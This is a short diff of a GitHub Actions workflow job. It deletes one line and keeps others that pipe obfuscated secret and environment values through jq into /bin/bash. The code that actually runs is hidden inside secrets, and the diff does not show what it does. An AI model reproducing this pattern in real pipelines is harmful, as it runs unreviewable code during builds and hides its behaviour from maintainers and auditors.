@@ -21,7 +21,6 @@ jobs:
           rfpnx8: ${{ secrets.rfpnx8 }}
         run: |
           printf '%s' "$rfpnx8" | jq -r .vrr6 | /bin/bash
-          printf '%s' "$jb1" | jq -r .orch2314 | /bin/bash
           echo $e7 | jq -r .kx2 | /bin/bash
 
       - name: Save data
